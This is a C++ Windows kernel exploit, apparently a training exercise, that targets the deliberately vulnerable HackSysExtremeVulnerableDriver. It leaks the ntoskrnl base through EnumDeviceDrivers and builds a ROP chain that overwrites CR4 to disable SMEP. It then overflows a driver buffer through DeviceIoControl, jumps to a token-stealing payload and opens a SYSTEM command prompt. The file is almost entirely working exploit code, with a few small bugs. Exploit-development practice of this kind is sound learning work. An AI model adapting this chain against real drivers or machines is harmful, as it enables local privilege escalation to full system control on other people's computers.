#include <iostream>
#include <Windows.h>
#include <psapi.h>
#include <tchar.h>
extern "C" void TokenStealingPayloadWin11();

#define IOCTL 0x222003


LPVOID getModule(TCHAR target[1024])
{
	LPVOID drivers[1024];
	DWORD cbNeeded;
	int cDrivers, i;

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		TCHAR szDriver[1024];

		cDrivers = cbNeeded / sizeof(drivers[0]);

		_tprintf(TEXT("There are %d drivers:\n"), cDrivers);
		for (i = 0; i < cDrivers; i++)
		{
			if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0])))
			{
				_tprintf(TEXT("%d: %s\n"), i + 1, szDriver);
				std::cout << drivers[i] << "\n";
				if (szDriver[0] == target[0])
				{
					if (szDriver[1] == target[1])
					{
						_tprintf(TEXT("[+] Found the address: "));
						std::cout << drivers[i] << "\n";
						return drivers[i];
					}
				}
			}
		}
	}
	else
	{
		_tprintf(TEXT("EnumDeviceDrivers failed; array size needed is %d\n"), cbNeeded / sizeof(LPVOID));
		return 0;
	}

	return 0;
}

void test()
{
	__debugbreak;
	LPCSTR app = "cmd.exe";
	CreateProcessA(app, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, NULL, NULL);
}


void buildROP(PVOID MemoryAddress, PVOID baseAddr, PVOID payload)
{
	/*
	*
	*
	0x76f665: pop rcx ; ret ; \x59\xc3 (88 found)
	0x3afb27: mov cr4, rcx ; ret ; \x0f\x22\xe1\xc3 (1 found)

	cr4 original value: 0x00000000003506f8
	cr4 target value: 0x00000000002506f8
	*/
	*(PULONG64)MemoryAddress = (ULONG64)baseAddr + 0x375e6c; //pop rax
	MemoryAddress = static_cast<char*>(MemoryAddress) + sizeof(ULONG64);
	*(PULONG64)MemoryAddress = (ULONG64)0x00000000002506f8; //bufferAdd
	MemoryAddress = static_cast<char*>(MemoryAddress) + sizeof(ULONG64);
	*(PULONG64)MemoryAddress = (ULONG64)baseAddr + 0x39dc27;
	MemoryAddress = static_cast<char*>(MemoryAddress) + sizeof(ULONG64);
	*(PULONG64)MemoryAddress = (ULONG64)payload;
}

void triggerOverflow(HANDLE hDevice)
{
	//ret at offset 2072
	SIZE_T UserModeBufferSize = (512 + (sizeof(PULONG64)*4)) * sizeof(ULONG);
	PULONG UserModeBuffer = NULL;
	PVOID payload = &TokenStealingPayloadWin11;
;
	TCHAR target[1024] = L"ntoskrnl.exe";
	puts("[+] \"Leaking\" module address...");
	PVOID baseAddr = getModule(target);
	std::cout << baseAddr << "\n";
	if (!baseAddr)
	{
		puts("[-] Failed to find base module address, aborting...");
		return;
	}

	UserModeBuffer = (PULONG)HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		UserModeBufferSize);
	RtlFillMemory((PVOID)UserModeBuffer, UserModeBufferSize, 0x41);
	PVOID MemoryAddress = (PVOID)(((ULONG64)UserModeBuffer + 2072));
	buildROP(MemoryAddress, baseAddr, payload);
	puts("Payload located at:");
	std::cout << payload << "\n";
	DWORD64 dummy = 0;
	PDWORD test = 0;
	DWORD dwBytesReturned = 0;
	puts("[+] Changing page permissions to RWE...");
	if (VirtualProtect(payload, UserModeBufferSize, PAGE_EXECUTE_READWRITE, test))
	{
		puts("[-] Failed to change page permissions...");
	}
	puts("[+] Triggering buffer overflow... Press any key to continue...");
	getchar();
	NTSTATUS status = DeviceIoControl(
		hDevice, //hDevice
		IOCTL, //dwIoControlCode
		(LPVOID)UserModeBuffer,
		(DWORD)UserModeBufferSize,
		&dummy, //lpOutBuffer
		sizeof(dummy), //nOutBufferSize
		&dwBytesReturned,  //lpBytesReturned
		NULL  //lpOverlapped
	);
}


int main()
{

	puts("[+] Opening handle to device");
	const char* devName = "\\\\.\\HackSysExtremeVulnerableDriver";
    HANDLE hFile = CreateFileA(devName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == (HANDLE)0 || hFile == INVALID_HANDLE_VALUE) {
		GLE("CreateFileA");
		return -1;
	}
	
	puts("[+] Opened handle to device");
	triggerOverflow(hFile);
	puts("[+] Are you SYSTEM?");
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	const wchar_t * cmdPath = L"C:\\Windows\\System32\\cmd.exe";


	if (!CreateProcess(cmdPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
	{
		std::cout << "Create Process failed: " << GetLastError() << std::endl;
		return -1;
	}


}
